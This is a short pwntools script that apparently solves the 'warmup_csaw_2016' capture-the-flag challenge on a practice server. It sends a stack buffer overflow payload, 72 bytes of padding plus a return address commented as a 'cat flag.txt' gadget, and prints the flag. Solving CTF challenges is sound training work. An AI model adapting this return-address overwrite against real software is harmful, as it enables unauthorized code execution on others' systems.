from pwn import *


def warmup_csaw_2016(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/warmup_saw_2016_1'):
    print('warmup_csaw_2016 start')

    get_flag_ptr = p64(0x40060D)  # system('cat flag.txt')
    target = remote('node4.buuoj.cn', 25828)
    payload = b'A' * 72 + get_flag_ptr
    target.sendline(payload)
    target.recvuntil('>')
    print('\n%s' % target.recvline().decode('utf-8'))
    print('warmup_csaw_2016 end')


if __name__ == '__main__':
    warmup_csaw_2016()
